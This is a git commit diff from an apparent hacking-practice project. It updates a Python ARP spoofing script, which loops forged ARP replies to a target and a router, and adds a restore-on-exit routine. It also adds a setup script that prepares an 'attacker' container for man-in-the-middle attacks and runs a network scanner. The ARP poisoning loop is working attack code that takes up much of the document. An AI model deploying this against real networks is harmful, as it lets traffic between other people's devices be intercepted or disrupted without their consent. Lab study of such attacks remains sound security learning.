f945cbbcb0222e0cdb03e2ee14007e3ec81ef386
Rajesh1308 <rajesharulrathna@gmail.com>
2024-05-24 20:25:41 +0530

    Setup script tested

--- ARP_Spoofing/spoofer.py
+++ ARP_Spoofing/spoofer.py
@@ -6,6 +6,13 @@ target_mac = ""
 router_ip = ""
 router_mac = ""
 
+def restore(target_ip, target_mac, router_ip, router_mac):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
+    scapy.send(packet, verbose=False)
+    packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
+    scapy.send(packet, verbose=False)
+    print("[+] Resetting ARP Tables")
+
 
 def get_details():
     ip = input(">> Enter the target ip range : ")
@@ -35,14 +42,18 @@ def spoof(target, router):
     router_ip = router["ip"]
     router_mac = router["mac"]
     packets_sent = 0
-    while True:
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
-        scapy.send(packet, verbose=False)
-        packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
-        scapy.send(packet, verbose=False)
-        packets_sent +=2
-        print(f"\r[+] Packets sent : {packets_sent}", end="")
-        time.sleep(2)
+    try:
+        while True:
+            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
+            scapy.send(packet, verbose=False)
+            packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
+            scapy.send(packet, verbose=False)
+            packets_sent +=2
+            print(f"\r[+] Packets sent : {packets_sent}", end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        restore(target_ip, target_mac, router_ip, router_mac)
+        print("[+] Terminating program")
 
 
 (target, router) = get_details()
---
+++ setup-attacker.sh
@@ -0,0 +1,19 @@
+#!bin/bash
+
+#######################################################################
+# Creator : Rajesh A                                                  #
+# Date : 24-05-2024                                                   #
+# This script installs the necessory tools sets up the container      #
+# as a hacking machine to run MITM. Atfer installation, it runs the   # 
+# network scanner                                                     #
+#######################################################################
+
+
+apt install python-is-python3 python3-pip iputils-ping net-tools -y
+apt install git -y
+pip install scapy
+git clone https://github.com/Rajesh1308/pyHack-project.git
+cd pyHack-project/Network_scanner/
+echo "Enter the target ip/range : "
+read ip
+python scanner.py -t $ip
